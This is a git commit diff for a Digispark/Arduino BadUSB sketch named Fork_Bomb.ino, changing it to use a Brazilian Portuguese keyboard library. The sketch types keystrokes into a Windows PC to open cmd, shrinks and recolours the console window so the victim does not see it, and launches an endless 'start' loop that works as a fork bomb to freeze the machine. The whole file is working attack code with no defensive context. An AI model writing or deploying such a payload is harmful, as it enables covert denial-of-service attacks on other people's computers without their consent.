af69b7b59ffa826785f4f3d3d85f5ed6a2d670f3
CyberDenner <146398551+CyberDenner@users.noreply.github.com>
2023-11-07 14:23:35 -0300

    Fork_Bomb.ino

--- TravarPC/Fork_Bomb.ino
+++ TravarPC/Fork_Bomb.ino
@@ -1,26 +1,23 @@
-#include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
 
 void setup() {
 }
 
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("cmd");
+  DigiKeyboardPtBr.delay(500);
   //Esconde o Terminal
-  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.println("MODE CON: COLS=15 LINES=1");
+  DigiKeyboardPtBr.delay(100);
+  DigiKeyboardPtBr.println("COLOR EF");
   //Ativa the fork bomb
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print(F("for /l %x in (0,0,0) do start"));
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
 
   for (;;) {}
 }
